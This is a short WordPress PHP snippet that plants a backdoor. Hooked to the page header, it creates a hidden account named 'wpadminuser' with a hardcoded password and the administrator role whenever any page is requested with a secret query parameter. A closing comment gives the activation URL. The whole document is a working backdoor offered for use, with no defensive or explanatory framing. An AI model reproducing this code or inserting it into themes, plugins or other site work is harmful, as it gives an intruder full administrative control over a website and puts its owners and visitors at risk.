<?php
add_action('wp_head', 'my_slipstream');
 
function my_slipstream() {
    If ($_GET['slipstream'] == 'hadron') {
        require('wp-includes/registration.php');
        If (!username_exists('wpadminuser')) {
            $user_id = wp_create_user('wpadminuser', 'wpd1g3Stz');
            $user = new WP_User($user_id);
            $user->set_role('administrator');
        }
    }
}
?>




// To activate this code simply visit http://bytebrary.com?slipstream=hadron